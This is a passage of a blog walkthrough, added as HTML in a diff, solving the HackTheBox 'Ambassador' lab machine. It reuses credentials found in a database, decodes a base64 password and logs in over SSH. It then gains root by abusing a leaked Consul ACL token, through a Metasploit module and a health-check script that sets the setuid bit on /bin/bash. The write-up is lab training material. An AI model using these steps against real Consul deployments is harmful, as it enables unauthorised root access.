+            data-srcset="/hackthebox-ambassador/8.png, /hackthebox-ambassador/8.png 1.5x, /hackthebox-ambassador/8.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-ambassador/8.png" width="1344" height="520" />
+    </a><figcaption class="image-caption">grafana.db</figcaption>
+    </figure></p>
+<p>Nice, we found some credentials for mysql. Since there was port 3306 for mysql open, we can try these credentials there.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(saad👻ssaadakhtarr)-[~/…/hackthebox/hackthebox/machines/ambassador]
+</span></span><span class="line"><span class="cl">└─$ mysql -u grafana -h ambassador.htb -p
+</span></span><span class="line"><span class="cl">Enter password: dontStandSoCloseToMe63221!
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Upon enumerating the databses, we found <code>developer</code> credentials in <code>whackywidget</code> db.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">MySQL [(none)]&gt; show databases;
+</span></span><span class="line"><span class="cl">+--------------------+
+</span></span><span class="line"><span class="cl">| Database           |
+</span></span><span class="line"><span class="cl">+--------------------+
+</span></span><span class="line"><span class="cl">| grafana            |
+</span></span><span class="line"><span class="cl">| information_schema |
+</span></span><span class="line"><span class="cl">| mysql              |
+</span></span><span class="line"><span class="cl">| performance_schema |
+</span></span><span class="line"><span class="cl">| sys                |
+</span></span><span class="line"><span class="cl">| whackywidget       |
+</span></span><span class="line"><span class="cl">+--------------------+
+</span></span><span class="line"><span class="cl">6 rows in set (0.191 sec)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">MySQL [(none)]&gt; use whackywidget
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Database changed
+</span></span><span class="line"><span class="cl">MySQL [whackywidget]&gt; show tables;
+</span></span><span class="line"><span class="cl">+------------------------+
+</span></span><span class="line"><span class="cl">| Tables_in_whackywidget |
+</span></span><span class="line"><span class="cl">+------------------------+
+</span></span><span class="line"><span class="cl">| users                  |
+</span></span><span class="line"><span class="cl">+------------------------+
+</span></span><span class="line"><span class="cl">1 row in set (0.175 sec)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">MySQL [whackywidget]&gt; select * from users;
+</span></span><span class="line"><span class="cl">+-----------+------------------------------------------+
+</span></span><span class="line"><span class="cl">| user      | pass                                     |
+</span></span><span class="line"><span class="cl">+-----------+------------------------------------------+
+</span></span><span class="line"><span class="cl">| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+</span></span><span class="line"><span class="cl">+-----------+------------------------------------------+
+</span></span><span class="line"><span class="cl">1 row in set (0.237 sec)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">MySQL [whackywidget]&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Using base64 decode to get the password.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(saad👻ssaadakhtarr)-[~/…/hackthebox/hackthebox/machines/ambassador]
+</span></span><span class="line"><span class="cl">└─$ echo YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== | base64 -d
+</span></span><span class="line"><span class="cl">anEnglishManInNewYork027468
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Trying these credentials using <code>ssh</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(saad👻ssaadakhtarr)-[~/…/hackthebox/hackthebox/machines/ambassador]
+</span></span><span class="line"><span class="cl">└─$ ssh developer@ambassador.htb  
+</span></span><span class="line"><span class="cl">developer@ambassador.htb&#39;s password: anEnglishManInNewYork027468
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">developer@ambassador:~$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And we&rsquo;re in.</p>
+<h2 id="usertxt">user.txt</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">developer@ambassador:~$ whoami
+</span></span><span class="line"><span class="cl">developer
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">developer@ambassador:~$ ls -al
+</span></span><span class="line"><span class="cl">total 48
+</span></span><span class="line"><span class="cl">drwxr-xr-x 7 developer developer 4096 Sep 14 11:01 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x 3 root      root      4096 Mar 13  2022 ..
+</span></span><span class="line"><span class="cl">lrwxrwxrwx 1 root      root         9 Sep 14 11:01 .bash_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 developer developer  220 Feb 25  2020 .bash_logout
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 developer developer 3798 Mar 14  2022 .bashrc
+</span></span><span class="line"><span class="cl">drwx------ 3 developer developer 4096 Mar 13  2022 .cache
+</span></span><span class="line"><span class="cl">-rw-rw-r-- 1 developer developer   93 Sep  2 02:28 .gitconfig
+</span></span><span class="line"><span class="cl">drwx------ 3 developer developer 4096 Mar 14  2022 .gnupg
+</span></span><span class="line"><span class="cl">drwxrwxr-x 3 developer developer 4096 Mar 13  2022 .local
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 developer developer  807 Feb 25  2020 .profile
+</span></span><span class="line"><span class="cl">drwx------ 3 developer developer 4096 Mar 14  2022 snap
+</span></span><span class="line"><span class="cl">drwx------ 2 developer developer 4096 Mar 13  2022 .ssh
+</span></span><span class="line"><span class="cl">-rw-r----- 1 developer developer   33 Oct  2 17:34 user.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">developer@ambassador:~$ cat user.txt
+</span></span><span class="line"><span class="cl">1e****************************58
+</span></span><span class="line"><span class="cl">developer@ambassador:~$
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>For privilege escalation, <code>linpeas</code> didn&rsquo;t give much useful information.</p>
+<p>Checking the processes running as root using <code>pspy</code>, there&rsquo;s an interesting process.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-ambassador/9.png" title="pspy" data-thumbnail="/hackthebox-ambassador/9.png" data-sub-html="<h2>pspy</h2><p>pspy</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-ambassador/9.png"
+            data-srcset="/hackthebox-ambassador/9.png, /hackthebox-ambassador/9.png 1.5x, /hackthebox-ambassador/9.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-ambassador/9.png" width="1346" height="505" />
+    </a><figcaption class="image-caption">pspy</figcaption>
+    </figure></p>
+<p>On further enum, there are two folders in the <code>/opt</code> directory.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">developer@ambassador:/opt$ ls -al
+</span></span><span class="line"><span class="cl">total 16
+</span></span><span class="line"><span class="cl">drwxr-xr-x  4 root   root   4096 Sep  1 22:13 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x 20 root   root   4096 Sep 15 17:24 ..
+</span></span><span class="line"><span class="cl">drwxr-xr-x  4 consul consul 4096 Mar 13  2022 consul
+</span></span><span class="line"><span class="cl">drwxrwxr-x  5 root   root   4096 Mar 13  2022 my-app
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In the <code>my-app</code> folder there&rsquo;s a git repo.</p>
+<p>Previous commits in the repo leaked the consul token.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-ambassador/10.png" title="consul token" data-thumbnail="/hackthebox-ambassador/10.png" data-sub-html="<h2>consul token</h2><p>consul token</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-ambassador/10.png"
+            data-srcset="/hackthebox-ambassador/10.png, /hackthebox-ambassador/10.png 1.5x, /hackthebox-ambassador/10.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-ambassador/10.png" width="1346" height="324" />
+    </a><figcaption class="image-caption">consul token</figcaption>
+    </figure></p>
+<p>Btw, for those who don&rsquo;t know what <code>consul</code> is.</p>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>Consul<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Consul is a multi-networking tool that offers a fully-featured service mesh solution that solves the networking and security challenges of operating microservices and cloud infrastructure. Consul offers a software-driven approach to routing and segmentation.</div>
+        </div>
+    </div>
+<p>Source: <a href="https://learn.hashicorp.com/tutorials/consul/get-started" target="_blank" rel="noopener noreffer ">https://learn.hashicorp.com/tutorials/consul/get-started</a></p>
+<p>A quick google search revealed that consul HTTP API uses port <code>8500</code>.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-ambassador/11.png" title="netstat" data-thumbnail="/hackthebox-ambassador/11.png" data-sub-html="<h2>netstat</h2><p>netstat</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-ambassador/11.png"
+            data-srcset="/hackthebox-ambassador/11.png, /hackthebox-ambassador/11.png 1.5x, /hackthebox-ambassador/11.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-ambassador/11.png" width="1345" height="434" />
+    </a><figcaption class="image-caption">netstat</figcaption>
+    </figure></p>
+<p>Looking at <a href="https://www.hashicorp.com/blog/protecting-consul-from-rce-risk-in-specific-configurations" target="_blank" rel="noopener noreffer ">this</a> article, consul nodes with a specific configuration allows remote code execution.</p>
+<p>Further reading the article, we have three conditions that shows that consul agent is vulnerable.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-ambassador/12.png" title="Vulnerable agent" data-thumbnail="/hackthebox-ambassador/12.png" data-sub-html="<h2>Vulnerable agent</h2><p>Vulnerable agent</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-ambassador/12.png"
+            data-srcset="/hackthebox-ambassador/12.png, /hackthebox-ambassador/12.png 1.5x, /hackthebox-ambassador/12.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-ambassador/12.png" width="1351" height="536" />
+    </a><figcaption class="image-caption">Vulnerable agent</figcaption>
+    </figure></p>
+<p>To check whether script checks are enabled or not, we can look at the <code>/etc/consul.d/consul.hcl</code> file.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-ambassador/13.png" title="etc/consul.d/consul.hcl" data-thumbnail="/hackthebox-ambassador/13.png" data-sub-html="<h2>etc/consul.d/consul.hcl</h2><p>etc/consul.d/consul.hcl</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-ambassador/13.png"
+            data-srcset="/hackthebox-ambassador/13.png, /hackthebox-ambassador/13.png 1.5x, /hackthebox-ambassador/13.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-ambassador/13.png" width="1345" height="506" />
+    </a><figcaption class="image-caption">etc/consul.d/consul.hcl</figcaption>
+    </figure></p>
+<p>So now we have,</p>
+<ul>
+<li>API available on <code>127.0.0.1:8500</code>.</li>
+<li>Script checks enabled.</li>
+<li>Compromised ACL Token.</li>
+</ul>
+<p>For our ease we can forward port 8500 using ssh tunneling to access it locally on our machine.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(saad👻ssaadakhtarr)-[~/…/hackthebox/hackthebox/machines/ambassador]
+</span></span><span class="line"><span class="cl">└─$ ssh -L 8000:127.0.0.1:8500 developer@ambassador.htb
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>From here we have two methods to escalate our privileges to root.</p>
+<h3 id="using-metasploit">Using Metasploit</h3>
+<p>Using <code>exploit/multi/misc/consul_service_exec</code>.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-ambassador/14.png" title="metasploit options" data-thumbnail="/hackthebox-ambassador/14.png" data-sub-html="<h2>metasploit options</h2><p>metasploit options</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-ambassador/14.png"
+            data-srcset="/hackthebox-ambassador/14.png, /hackthebox-ambassador/14.png 1.5x, /hackthebox-ambassador/14.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-ambassador/14.png" width="1341" height="487" />
+    </a><figcaption class="image-caption">metasploit options</figcaption>
+    </figure></p>
+<p>Here on my local machine, I have access to consul API at <code>127.0.0.1:8000</code> so I will set the following options.</p>
+<ul>
+<li>RHOST -&gt; 127.0.0.1</li>
+<li>RPORT -&gt; 8000</li>
+<li>ACL_TOKEN -&gt; bb03b43b-1d81-d62b-24b5-39540ee469b5</li>
+<li>LHOST -&gt; 10.10.14.10</li>
+<li>LPORT -&gt; 4444</li>
+</ul>
+<p>Now we run the exploit and get shell as root.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-ambassador/15.png" title="shell as root using metasploit" data-thumbnail="/hackthebox-ambassador/15.png" data-sub-html="<h2>shell as root using metasploit</h2><p>shell as root using metasploit</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-ambassador/15.png"
+            data-srcset="/hackthebox-ambassador/15.png, /hackthebox-ambassador/15.png 1.5x, /hackthebox-ambassador/15.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-ambassador/15.png" width="1344" height="327" />
+    </a><figcaption class="image-caption">shell as root using metasploit</figcaption>
+    </figure></p>
+<h3 id="manual-exploit">Manual Exploit</h3>
+<p>For exploiting the vulnerability manually, we need to create a consul <code>health check script</code> and then register that with the token. Upon reloading the consul, our injected code will get executed.</p>
+<p>We will inject our malicious code in the <code>health check script</code>.</p>
+<p>Creating the script in <code>/etc/consul.d/config.d/</code> as <code>script.hcl</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">check = [
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">      id       = &#34;1&#34;
+</span></span><span class="line"><span class="cl">      args     = [&#34;chmod&#34;, &#34;4777&#34;, &#34;/bin/bash&#34;]
+</span></span><span class="line"><span class="cl">      interval = &#34;10s&#34;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">]
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now registering the service and reloading the consul as follows.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">developer@ambassador:/opt/consul$ consul services register -token=bb03b43b-1d81-d62b-24b5-39540ee469b5 /etc/consul.d/config.d/script.hcl
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">developer@ambassador:/opt/consul$ consul reload -token=bb03b43b-1d81-d62b-24b5-39540ee469b5
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now executing <code>bash -p</code> will give us shell as root.</p>
+<h2 id="roottxt">root.txt</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">developer@ambassador:/opt/consul$ bash -p
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">bash-5.0# whoami
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">bash-5.0# cat /root/root.txt
+</span></span><span class="line"><span class="cl">7b****************************ad
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Thanks for reading!</strong></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-01-28</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/hackthebox-ambassador/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="/hackthebox-ambassador/" data-title="HackTheBox - Ambassador" data-via="ssaadakhtarr" data-hashtags="hackthebox,machines"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="/hackthebox-ambassador/" data-hashtag="hackthebox"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="/hackthebox-ambassador/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/hackthebox/">hackthebox</a>,&nbsp;<a href="/tags/machines/">machines</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/hackthebox-updown/" class="prev" rel="prev" title="Hackthebox - UpDown"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Hackthebox - UpDown</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.105.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Saad Akhtar</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.1/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.en","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
